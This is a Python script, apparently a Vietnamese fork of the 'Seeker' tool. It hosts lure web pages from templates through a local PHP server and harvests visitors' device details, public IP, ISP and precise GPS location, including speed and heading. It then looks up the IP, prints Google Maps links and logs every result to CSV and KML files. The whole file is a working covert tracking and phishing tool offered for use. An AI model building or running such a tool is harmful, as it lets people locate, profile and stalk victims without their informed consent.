#!/usr/bin/env python3
"""
SeekerPro - Advanced Geolocation Tool
Author: TranQuyTai
Version: 1.3.2
"""

import sys
import utils
import argparse
import requests
import traceback
import shutil
import logging
import json
import os
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from packaging import version
from datetime import datetime

# Phiên bản hiện tại
VERSION = '1.3.2'

# Màu sắc giao diện
R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow
B = '\033[34m'  # blue
P = '\033[35m'  # purple

# Banner hiển thị thông tin ứng dụng
banner = f"""{G}
┌─────────────────────────────────────────────┐
│{P}            ╔═╗╔═╗╔═╗╦╔═╔═╗╦═╗{G}              │
│{P}            ╚═╗║╣ ║╣ ╠╩╗║╣ ╠╦╝{G}              │
│{P}            ╚═╝╚═╝╚═╝╩ ╩╚═╝╩╚═{G}              │
│                                             │
│{C} ▶ {W}Tác Giả     : TranQuyTai               {G}│
│{C} ▶ {W}Facebook    : facebook.com/TranQuyTaii  {G}│
│{C} ▶ {W}Phiên Bản   : {VERSION}                   {G}│
└─────────────────────────────────────────────┘
{W}"""

print(banner)

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='Tên file KML')
parser.add_argument(
    '-p', '--port', type=int, default=8080, help='Cổng máy chủ web [ Mặc định : 8080 ]'
)
parser.add_argument('-u', '--update', action='store_true', help='Kiểm tra cập nhật')
parser.add_argument('-v', '--version', action='store_true', help='Hiển thị phiên bản')
parser.add_argument(
    '-d',
    '--debugHTTP',
    type=bool,
    default=False,
    help='Tắt chuyển hướng HTTPS (chỉ dành cho kiểm thử)',
)

args = parser.parse_args()
kml_fname = args.kml
port = getenv('PORT') or args.port
chk_upd = args.update
print_v = args.version

if (
    getenv('DEBUG_HTTP')
    and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')
) or args.debugHTTP is True:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

# Tự động chọn template NearYou
templateNum = 0

# Cấu hình đường dẫn và thư mục
path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
REPORT_DIR = f'{path_to_script}/reports'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/TranQuyTai/seeker/master/metadata.json'
PID_FILE = f'{path_to_script}/pid'

# Đảm bảo tất cả thư mục cần thiết đều tồn tại
for directory in [LOG_DIR, DB_DIR, REPORT_DIR]:
    if not path.isdir(directory):
        mkdir(directory)
        print(f"{G}[+] {W}Đã tạo thư mục: {directory}")

# Thiết lập logging
logging.basicConfig(
    level=logging.INFO,
    format=f'{G}[%(asctime)s]{W} %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.FileHandler(f'{LOG_DIR}/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("seeker")


def check_for_updates():
    """
    Kiểm tra và thông báo phiên bản cập nhật mới
    """
    try:
        print(f'{G}[*]{W} Đang kiểm tra cập nhật...', end='')
        rqst = requests.get(META_URL, timeout=5)
        meta_sc = rqst.status_code
        
        if meta_sc == 200:
            print(f'{G} OK{W}')
            metadata = rqst.text
            try:
                json_data = loads(metadata)
                gh_version = json_data['version']
                
                if version.parse(gh_version) > version.parse(VERSION):
                    print(f'{G}[!]{Y} Phát hiện phiên bản mới: {gh_version}{W}')
                    print(f'{G}[!]{C} Những thay đổi: {json_data.get("changes", "Không có thông tin")}{W}')
                    print(f'{G}[!]{W} Cập nhật bằng cách chạy: {G}git pull origin master{W}')
                else:
                    print(f'{G}[*]{W} SeekerPro đang chạy phiên bản mới nhất ({VERSION})')
            except json.decoder.JSONDecodeError:
                print(f'{R}[!]{W} Lỗi phân tích dữ liệu JSON')
        else:
            print(f'{R} Thất bại (Mã trạng thái: {meta_sc}){W}')
            
    except requests.exceptions.Timeout:
        print(f'{R} Hết thời gian chờ kết nối{W}')
    except requests.exceptions.ConnectionError:
        print(f'{R} Không thể kết nối đến máy chủ{W}')
    except Exception as exc:
        logger.error(f'Lỗi kiểm tra cập nhật: {str(exc)}')


if chk_upd is True:
    check_for_updates()
    sys.exit()

if print_v is True:
    utils.print(VERSION)
    sys.exit()

import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

# Tạm thời để xử lý ngoại lệ psutil trên termux
with open(devnull, 'w') as nf:
    sys.stderr = nf
    import psutil
sys.stderr = sys.__stderr__


def banner():
    with open(META_FILE, 'r') as metadata:
        json_data = loads(metadata.read())
        facebook_url = json_data.get('facebook', 'https://facebook.com/TranQuyTaii')

    art = r"""
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/"""
    utils.print(f'{G}{art}{W}\n')
    utils.print(f'{G}[>] {C}Tác Giả      : {W}TranQuyTai')
    utils.print(f'{G} |---> {C}Facebook   : {W}{facebook_url}')
    utils.print(f'{G}[>] {C}Phiên Bản    : {W}{VERSION}\n')


def template_select(site):
    print()
    
    with open(TEMPLATES_JSON, 'r') as templ:
        templ_info = templ.read()

    templ_json = loads(templ_info)
    
    # Hiển thị menu lựa chọn template
    utils.print(f'{G}[+] {C}Chọn mẫu trang web để sử dụng:{W}\n')
    
    for index, template in enumerate(templ_json['templates']):
        utils.print(f'{G}[{index + 1}] {Y}{template["name"]}{W}')
    
    print()
    
    while True:
        try:
            choice = int(input(f'{G}[>] {C}Lựa chọn: {W}'))
            if 1 <= choice <= len(templ_json['templates']):
                selected_template = templ_json['templates'][choice - 1]
                site = selected_template['dir_name']
                imp_file = selected_template['import_file']
                utils.print(f'\n{G}[+] {C}Đang tải mẫu {Y}{selected_template["name"]}{C}...{W}')
                break
            else:
                utils.print(f'{R}[!] {C}Lựa chọn không hợp lệ. Vui lòng thử lại.{W}')
        except ValueError:
            utils.print(f'{R}[!] {C}Vui lòng nhập một số.{W}')
    
    importlib.import_module(f'template.{imp_file}')
    shutil.copyfile(
        'php/error.php',
        f'template/{site}/error_handler.php',
    )
    shutil.copyfile(
        'php/info.php',
        f'template/{site}/info_handler.php',
    )
    shutil.copyfile(
        'php/result.php',
        f'template/{site}/result_handler.php',
    )
    jsdir = f'template/{site}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)
    shutil.copyfile('js/location.js', jsdir + '/location.js')
    return site


def server():
    print()
    port_free = False
    utils.print(f'{G}[+] {C}Cổng : {W}{port}\n')
    utils.print(f'{G}[+] {C}Bắt đầu máy chủ PHP...{W}', end='')
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True

    if not port_free and path.exists(PID_FILE):
        with open(PID_FILE, 'r') as pid_info:
            pid = int(pid_info.read().strip())
            try:
                old_proc = psutil.Process(pid)
                utils.print(f'{C}[ {R}✘{C} ]{W}')
                utils.print(
                    f'{Y}[!] Tìm thấy phiên PHP server cũ, đang khởi động lại...{W}'
                )
                utils.print(f'{G}[+] {C}Bắt đầu máy chủ PHP...{W}', end='')
                try:
                    sleep(1)
                    if old_proc.status() != 'running':
                        old_proc.kill()
                    else:
                        utils.print(f'{C}[ {R}✘{C} ]{W}')
                        utils.print(
                            f'{R}[-] {C}Không thể tắt tiến trình PHP server, hãy tắt thủ công{W}'
                        )
                        sys.exit()
                except psutil.NoSuchProcess:
                    pass
            except psutil.NoSuchProcess:
                utils.print(f'{C}[ {R}✘{C} ]{W}')
                utils.print(
                    f'{R}[-] {C}Cổng {W}{port} {C}đang được sử dụng bởi một dịch vụ khác.{W}'
                )
                sys.exit()
    elif not port_free and not path.exists(PID_FILE):
        utils.print(f'{C}[ {R}✘{C} ]{W}')
        utils.print(
            f'{R}[-] {C}Cổng {W}{port} {C}đang được sử dụng bởi một dịch vụ khác.{W}'
        )
        sys.exit()
    elif port_free:
        pass

    with open(LOG_FILE, 'w') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        with open(PID_FILE, 'w') as pid_out:
            pid_out.write(str(proc.pid))

        sleep(3)

        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
            php_sc = php_rqst.status_code
            if php_sc == 200:
                utils.print(f'{C}[ {G}✔{C} ]{W}')
                print()
            else:
                utils.print(f'{C}[ {R}Trạng thái : {php_sc}{C} ]{W}')
                cl_quit()
        except requests.ConnectionError:
            utils.print(f'{C}[ {R}✘{C} ]{W}')
            cl_quit()


def wait():
    printed = False
    while True:
        sleep(2)
        size = path.getsize(RESULT)
        if size == 0 and printed is False:
            utils.print(f'{G}[+] {C}Đang chờ khách hàng...{Y}[ctrl+c để thoát]{W}\n')
            printed = True
        if size > 0:
            data_parser()
            printed = False


def data_parser():
    data_row = []
    with open(INFO, 'r') as info_file:
        info_content = info_file.read()
    if not info_content or info_content.strip() == '':
        return
    try:
        info_json = loads(info_content)
    except decoder.JSONDecodeError:
        utils.print(f'{R}[-] {C}Ngoại lệ : {R}{traceback.format_exc()}{W}')
    else:
        var_os = info_json['os']
        var_platform = info_json['platform']
        var_cores = info_json['cores']
        var_ram = info_json['ram']
        var_vendor = info_json['vendor']
        var_render = info_json['render']
        var_res = info_json['wd'] + 'x' + info_json['ht']
        var_browser = info_json['browser']
        var_ip = info_json['ip']

        data_row.extend(
            [
                var_os,
                var_platform,
                var_cores,
                var_ram,
                var_vendor,
                var_render,
                var_res,
                var_browser,
                var_ip,
            ]
        )
        device_info = f"""{Y}[!] Thông Tin Thiết Bị :{W}

{G}[+] {C}Hệ điều hành : {W}{var_os}
{G}[+] {C}Nền tảng     : {W}{var_platform}
{G}[+] {C}Nhân CPU     : {W}{var_cores}
{G}[+] {C}RAM          : {W}{var_ram}
{G}[+] {C}GPU Vendor   : {W}{var_vendor}
{G}[+] {C}GPU          : {W}{var_render}
{G}[+] {C}Độ phân giải : {W}{var_res}
{G}[+] {C}Trình duyệt  : {W}{var_browser}
{G}[+] {C}IP Công cộng : {W}{var_ip}
"""
        utils.print(device_info)

        if ip_address(var_ip).is_private:
            utils.print(f'{Y}[!] Bỏ qua IP recon vì địa chỉ IP là riêng tư{W}')
        else:
            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
            s_code = rqst.status_code

            if s_code == 200:
                data = rqst.text
                data = loads(data)
                var_continent = str(data['continent'])
                var_country = str(data['country'])
                var_region = str(data['region'])
                var_city = str(data['city'])
                var_org = str(data['org'])
                var_isp = str(data['isp'])

                data_row.extend(
                    [var_continent, var_country, var_region, var_city, var_org, var_isp]
                )
                ip_info = f"""{Y}[!] Thông Tin IP :{W}

{G}[+] {C}Châu lục  : {W}{var_continent}
{G}[+] {C}Quốc gia  : {W}{var_country}
{G}[+] {C}Khu vực   : {W}{var_region}
{G}[+] {C}Thành phố : {W}{var_city}
{G}[+] {C}Tổ chức   : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
"""
                utils.print(ip_info)

    with open(RESULT, 'r') as result_file:
        results = result_file.read()
        try:
            result_json = loads(results)
        except decoder.JSONDecodeError:
            utils.print(f'{R}[-] {C}Ngoại lệ : {R}{traceback.format_exc()}{W}')
        else:
            status = result_json['status']
            if status == 'success':
                var_lat = result_json['lat']
                var_lon = result_json['lon']
                var_acc = result_json['acc']
                var_alt = result_json['alt']
                var_dir = result_json['dir']
                var_spd = result_json['spd']

                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
                loc_info = f"""{Y}[!] Thông Tin Vị Trí :{W}

{G}[+] {C}Vĩ độ    : {W}{var_lat}
{G}[+] {C}Kinh độ  : {W}{var_lon}
{G}[+] {C}Độ chính xác : {W}{var_acc}
{G}[+] {C}Độ cao   : {W}{var_alt}
{G}[+] {C}Hướng    : {W}{var_dir}
{G}[+] {C}Tốc độ   : {W}{var_spd}
"""
                utils.print(loc_info)
                gmaps_link = f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
                gmaps_url = f'{G}[+] {C}Google Maps : {W}{gmaps_link}'
                gmaps_json = {
                    'url': gmaps_link
                }
                utils.print(gmaps_url)
                
                # Thêm đường dẫn Google Maps vào data_row
                data_row.append(gmaps_link)

                if kml_fname is not None:
                    kmlout(var_lat, var_lon)
            else:
                var_err = result_json['error']
                utils.print(f'{R}[-] {C}{var_err}\n')
                data_row.append("Không có dữ liệu vị trí")

    csvout(data_row)
    clear()
    return


def kmlout(var_lat, var_lon):
    with open(TEMP_KML, 'r') as kml_sample:
        kml_sample_data = kml_sample.read()

    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    utils.print(f'{Y}[!] Đã tạo tệp KML!{W}')
    utils.print(f'{G}[+] {C}Đường dẫn : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
    with open(DATA_FILE, 'a') as csvfile:
        csvwriter = writer(csvfile)
        csvwriter.writerow(row)
    utils.print(f'{G}[+] {C}Đã lưu dữ liệu : {W}{path_to_script}/db/results.csv')
    utils.print(f'{G}[+] {C}Google Maps đã được lưu trong file CSV\n')


def clear():
    with open(RESULT, 'w+'):
        pass
    with open(INFO, 'w+'):
        pass


def repeat():
    clear()
    wait()


def cl_quit():
    if not path.isfile(PID_FILE):
        return
    with open(PID_FILE, 'r') as pid_info:
        pid = int(pid_info.read().strip())
        kill(pid, SIGTERM)
    remove(PID_FILE)
    sys.exit()


try:
    banner()
    clear()
    SITE = template_select(SITE)
    server()
    wait()
    data_parser()
except KeyboardInterrupt:
    utils.print(f'{R}[-] {C}Ngắt từ bàn phím.{W}')
    cl_quit()
else:
    repeat()
